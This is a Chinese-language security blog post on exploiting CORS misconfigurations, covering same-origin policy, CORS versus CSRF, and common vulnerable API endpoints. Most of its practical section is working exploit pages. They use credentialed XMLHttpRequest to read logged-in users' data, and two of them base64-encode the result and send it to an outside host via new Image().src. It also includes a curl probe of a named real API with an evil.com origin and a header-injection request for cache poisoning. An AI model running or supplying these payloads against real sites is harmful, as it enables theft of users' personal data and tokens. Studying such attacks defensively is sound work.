<h1 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略SOP是应用程序安全性中的一个重要概念涉及大量的客户端脚本语言例如JavaScript。<br>SOP规则允许脚本运行在来自同一站点同一源的页面访问方法和其他脚本的属性没有特别限制的页面中同时阻止访问大多数方法和来自不同站点的页面之间的属性不同的来源。<br>这种机制对于现代Web应用程序尤其重要因为它们广泛依赖HTTP cookie保持经过身份验证的用户会话服务器决定是否向客户端发送基于会话cookie的客户信息的机密信息。<br>客户端例如浏览器必须保证来自无关网站来源的内容之间的严格分离以防止数据完整性和机密性的丢失。<br>术语&quot;源&quot;使用以下定义<br>-域名<br>-应用协议<br>-TCP端口<br>当且仅当前面三个值完全相同时才认为两个资源具有同源基础。<br>为了更好地解释该概念下表显示了关于URL &quot;<a href="http://www.example.com/dir/page.html" target="_blank" rel="noopener">http://www.example.com/dir/page.html</a>&quot; 的同源策略控制结果。</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtuf2mkmj20yq0dnjuc.jpg" alt></p>
<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><h3 id="cors与csrf"><a href="#cors与csrf" class="headerlink" title="cors与csrf"></a>cors与csrf</h3><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtz8pwk1j20w70bzjuc.jpg" alt></p>
<p><strong>cors与csrf相同点：</strong></p>
<ol>
<li><p>都要借助第三方网站</p>
</li>
<li><p>都要借助ajax的异步过程</p>
</li>
<li><p>一般都需要用户登陆</p>
</li>
</ol>
<p><strong>cors与csrf不同点：</strong></p>
<ol>
<li><p>第三方网站可以利用CORS漏洞读取到受害者的敏感信息</p>
</li>
<li><p>第三方网站可以利用csrf漏洞可以替受害者完成诸如转账等敏感操作</p>
</li>
<li><p><strong>一般有CORS漏洞的地方都有csrf漏洞</strong></p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtvv1s3tj20y40d377r.jpg" alt></p>
<h3 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h3><p>使用burpsute自动化检测漏洞小技巧</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu1jze7rj20qw06xq3n.jpg" alt></p>
<p>Access-Control-Allow-Origin: Wh0ale.com</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu3pemt4j20np08ijs0.jpg" alt></p>
<h3 id="常见漏洞点"><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h3><p><strong>如果Access-Control-Allow-Origin可控，且Access-Control-Allow-Credentials为true</strong>大概率有该漏洞</p>
<p><strong>常见漏洞点：</strong></p>
<ol>
<li><p>互联网厂商的api接口</p>
</li>
<li><p>聊天的程序的api接口</p>
</li>
<li><p>app的api（不过有一些请求需要带有一些额外的请求头，利用起来比较困难）</p>
</li>
<li><p>区块链厂商</p>
</li>
</ol>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><h4 id="①-利用某子域的xss绕过Referer的检查"><a href="#①-利用某子域的xss绕过Referer的检查" class="headerlink" title="① 利用某子域的xss绕过Referer的检查"></a>① 利用某子域的xss绕过Referer的检查</h4><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu9viqfej20li0bhq4e.jpg" alt></p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua10g3cj20z80d9q6v.jpg" alt></p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua5ly51j20xu0brmyp.jpg" alt></p>
<h4 id="②null源"><a href="#②null源" class="headerlink" title="②null源"></a>②null源</h4><p>CORS的规范中还提到了&quot;NULL&quot;源。触发这个源是为了<strong>网页跳转或者是来自本地HTML文</strong>件。 目标应用可能会接收&quot;null&quot;源，并且这个可能被测试者（或者攻击者）利用，<strong>任何网站很容易使用沙盒iframe来获取&quot;null&quot;源</strong></p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyguebob6vj20xb0jr7hy.jpg" alt></p>
<p><strong>为什么服务器端会有这样的漏洞</strong></p>
<ul>
<li>1.开发人员开发，调试，测试代码一般都在本地</li>
<li>2.有时候他们会调用线上服务器数据</li>
<li>3.所以这样的问题很隐蔽也很常见</li>
</ul>
<h4 id="③-poc"><a href="#③-poc" class="headerlink" title="③ poc"></a>③ poc</h4><p>该poc上传到自己的服务器，如果一个已经登陆的用户访问我们的网站的话，那么就可以把他的个人信息导入到我的网站里面</p>
<ol>
<li>CURL这个指令来测试这个网站</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>返回结果</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Origin: https://evil.com</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>发现一个接口可以查看已登录用户的详细信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.artsy.net/api/user_details/</span><br></pre></td></tr></table></figure>

<p>使用geekboy分享的exp来检测，看看能不能导出用户的id，注册日期，邮箱，手机号，用户凭证，重置密码凭证，收藏品，用户设备等用户信息。</p>
<p><strong>geekboy:</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC Exploit<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract SID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"cors()"</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = alert(<span class="keyword">this</span>.responseText);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"https://target.com/userinfo/"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>new Image().src</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC Exploit<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"cors()"</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">new</span> Image().src=<span class="string">"http://cors.reiwgah.exeye.io/"</span> + <span class="built_in">window</span>.btoa(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(<span class="keyword">this</span>.responseText)))</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"http://www.pxc.local/master/rolePage/search?page=1&amp;roleCd=1&amp;desc=&amp;pageCode=qx02&amp;_=1531712664191"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>CORS EXP跨域测试</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> options = &#123;</span></span><br><span class="line"><span class="javascript">                type: <span class="string">'get'</span>,</span></span><br><span class="line"><span class="javascript">                xhrFields: &#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;,</span></span><br><span class="line"><span class="javascript">                url: <span class="string">"http://www.pxc.local/master/rolePage/search?page=1&amp;roleCd=1&amp;desc=&amp;pageCode=qx02"</span>,</span></span><br><span class="line"><span class="javascript">                success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="built_in">JSON</span>.stringify(result));</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"><span class="javascript">            $(<span class="string">"#btn1"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span></span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    $.ajax(options);</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btn1"</span> <span class="attr">value</span>=<span class="string">"发送一个CORS请求并获取返回结果"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><a href="http://cors.reiwgah.exeye.io/" target="_blank" rel="noopener">http://cors.reiwgah.exeye.io/</a></strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> options = &#123;</span></span><br><span class="line"><span class="javascript">                type: <span class="string">'get'</span>,</span></span><br><span class="line"><span class="javascript">                xhrFields: &#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;,</span></span><br><span class="line"><span class="javascript">                url: <span class="string">"http://www.pxc.local/master/rolePage/search?page=1&amp;roleCd=1&amp;desc=&amp;pageCode=qx02"</span>,</span></span><br><span class="line"><span class="javascript">                success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">new</span> Image().src=<span class="string">"http://cors.reiwgah.exeye.io/"</span> + <span class="built_in">window</span>.btoa(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(<span class="built_in">JSON</span>.stringify(result))))</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//alert(JSON.stringify(result));</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"><span class="javascript">            $(<span class="string">"#btn1"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span></span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    $.ajax(options);</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btn1"</span> <span class="attr">value</span>=<span class="string">"发送一个CORS请求并获取返回结果"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用github脚本</strong></p>
<blockquote>
<p>python corser.py -poc GET</p>
<p>python corser.py -poc POST</p>
</blockquote>
<p>使用此代码攻击者可以通过接收响应的&quot;日志&quot;处理程序从易受攻击的域名窃取数据。<br>当受害者在目标应用程序&quot;vulnerability.domain&quot;上进行身份验证时访问包含该页面的页面在前面的代码中浏览器将以下请求发送到&quot;<strong>vulnerability.domain</strong>&quot;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html</span></span><br><span class="line"><span class="meta">&lt;html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> params = <span class="string">'&#123;"appAccount":"","positionCode":"","cn":"","companyCode":"","state":"","pageNumber":1,"pageSize":15,"pageCode":"qx01"&#125;'</span>;</span></span><br><span class="line"><span class="javascript">                xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">                                <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = alert(<span class="keyword">this</span>.responseText);</span></span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"><span class="javascript">                xhttp.open(<span class="string">"POST"</span>, <span class="string">"http://www.pxc.local/master/userAuth/list"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/json;charset=UTF-8'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-Requested-With'</span>, <span class="string">'XMLHttpRequest'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'CSRF'</span>, <span class="string">'Token'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'Accept'</span>, <span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-AUTH-TOKEN'</span>, <span class="string">'X-AUTH-TOKEN'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-AUTH-UID'</span>, <span class="string">'X-AUTH-UID'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">                xhttp.send(params);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract Information<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"cors()"</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/private-data HTTP/1.1</span><br><span class="line">Host: vulnerable.domain</span><br><span class="line">Origin: https://attacker.domain/</span><br><span class="line">Cookie: JSESSIONID=&lt;redacted&gt;</span><br></pre></td></tr></table></figure>

<p>应用程序响应如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: Apache-Coyote/<span class="number">1.1</span></span><br><span class="line">Access-Control-Allow-Origin: https:<span class="comment">//attacker.domain</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="keyword">true</span></span><br><span class="line">Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials</span><br><span class="line">Vary: Origin</span><br><span class="line">Expires: Thu, <span class="number">01</span> Jan <span class="number">1970</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> GMT</span><br><span class="line">Last-Modified: Wed, <span class="number">02</span> May <span class="number">2018</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">07</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, max-age=<span class="number">0</span>, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json;charset=ISO<span class="number">-8859</span><span class="number">-1</span></span><br><span class="line">Date: Wed, <span class="number">02</span> May <span class="number">2018</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">07</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">149</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"id"</span>:<span class="number">1234567</span>,<span class="string">"name"</span>:<span class="string">"Name"</span>,<span class="string">"surname"</span>:<span class="string">"Surname"</span>,<span class="string">"email"</span>:<span class="string">"email@target.local"</span>,<span class="string">"account"</span>:<span class="string">"ACT1234567"</span>,<span class="string">"balance"</span>:<span class="string">"123456,7"</span>,<span class="string">"token"</span>:<span class="string">"to</span></span><br><span class="line"><span class="string">p-secret-string"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>由于服务器发送了两个&quot;<code>Access-Control-Allow-*</code>&quot;标头受害者的浏览器允许使用JavaScript<br>代码包含在恶意页面中以访问私有数据。</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygxgwtt7gj20s30cyab9.jpg" alt></p>
<h4 id="④服务器端高速缓存投毒"><a href="#④服务器端高速缓存投毒" class="headerlink" title="④服务器端高速缓存投毒"></a>④服务器端高速缓存投毒</h4><p>另一种潜在的攻击利用CORS错误配置来注入任意HTTP头这可能会保存在服务器端缓存中例如创建存储的XSS。<br>利用此攻击的先决条件如下</p>
<ul>
<li><p>存在服务器端缓存</p>
</li>
<li><p>反射&quot;Origin&quot;标头</p>
</li>
<li><p>在&quot;Origin&quot;标头内没有检查&quot;\ r&quot;之类的非法字符</p>
<p>根据前面的先决条件James Kettle展示了利用HTTP头注入的针对IE / Edge受害者的漏洞的可能性。因为他们使用&quot;<strong>\ r \ n&quot;0x0d</strong>作为有效的HTTP标头终结符。</p>
<p>请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Origin: z[0x0d]Content-Type: text/html; charset=UTF-7</span><br></pre></td></tr></table></figure>

<p>IE解析的响应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: z</span><br><span class="line">Content-Type: text/html; charset=UTF-7</span><br></pre></td></tr></table></figure>

<p>前面的请求不能直接利用因为攻击者无法让受害者成为受害者浏览器发送前面的格式错误的标头。<br>如果攻击者使用格式错误的&quot;Origin&quot;标头发送前一个请求例如使用代理或命令行然后服务器可以缓存响应并将其提供给其他人。<br>在前面的示例中有效负载将页面的字符集更改为&quot;UTF-7&quot;众所周知这是对创建XSS漏洞很有用。</p>
</li>
</ul>
